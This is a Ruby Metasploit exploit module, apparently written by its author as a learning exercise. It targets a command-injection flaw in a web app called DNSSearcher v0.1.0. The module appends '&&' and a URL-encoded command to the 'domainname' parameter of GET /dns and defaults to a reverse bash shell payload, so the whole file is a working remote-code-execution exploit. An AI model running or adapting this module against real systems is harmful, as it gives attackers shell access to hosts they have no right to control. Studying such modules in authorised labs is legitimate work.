class MetasploitModule < Msf::Exploit::Remote
    Rank = GoodRanking
    include Msf::Exploit::Remote::HttpClient
  
    def initialize(info = {}) # I don't know why calls are made to update_info instead of filling this out
      super( # passes this to Msf::Exploit::Remote's update_info?
        update_info(
          info,
          'Name' => 'Command Injection against DNSSearcher v0.1.0 Using Unix Command',
          'Description' => 'This exploits a command injection aganst dnssearcher using the command stager.'          ,
          'License' => MSF_LICENSE,
          'Author' => [ 'Connor Shade' ],
          'References' => [ [ 'URL', 'https://connorshade.com/service-to-shell/custom-metasploit/' ] ],
          'Platform' => 'linux', # used for determining compatibility
          # For webapps, platform is typically the language of the webapp, I'm unsure since this is command injection on the webserver though
          'Targets' => [
            [
              'Unix Command',
              {
                'Platform' => 'unix',
                'Arch' => ARCH_CMD,
                'Type' => :unix_cmd, # type of exploit
                'DefaultOptions' => {
                  'PAYLOAD' => 'cmd/unix/reverse_bash',
                  'RPORT' => 8000,
                }
              }
            ],
            ],
          'Payload' => { 'BadChars' => "\x00" }, # Characters that cannot exist in the payload?
          'Privileged' => true, # Whether or not this requires or gives privileged access https://github.com/rapid7/metasploit-framework/blob/9e7960fd9ffe5cc2866e047aa75193d9858603e8/modules/exploits/example_webapp.rb#L61
          'DisclosureDate' => '2023-08-04',
          'DefaultTarget' => 0, # 0th item in Targets https://github.com/rapid7/metasploit-framework/blob/9e7960fd9ffe5cc2866e047aa75193d9858603e8/modules/exploits/example.rb#L61C15-L61C15
          'Notes' => { # Required for new modules https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
            'Stability' => [CRASH_SAFE],
            'Reliability' => [REPEATABLE_SESSION],
            'SideEffects' => [IOC_IN_LOGS]
          }
        )
      )
    end
  
    def filter_bad_chars(cmd)
        cmd.gsub!(/&/, '%26')
        cmd.gsub!(/ /, '%20')
        cmd.gsub!(/'/, '%27')
      end
    
    def execute_command(cmd, _opts = {}) # This just seems to be the default signature
        send_request_cgi({ # No parsing required
            'method' => 'GET',
            'uri' => '/dns',
            'encode_params' => false, # Encoding is already done and necessary chars are replaced with filter_bad_chars
            'vars_get' => { # GET parameters
              'domainname' => "bing.com%20%26%26%20#{filter_bad_chars(cmd)}", # The only one is domainname, which is the injectable param
            }
        })
    end
  
    def exploit
        print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
        execute_command(payload.encoded)
      end
    end
  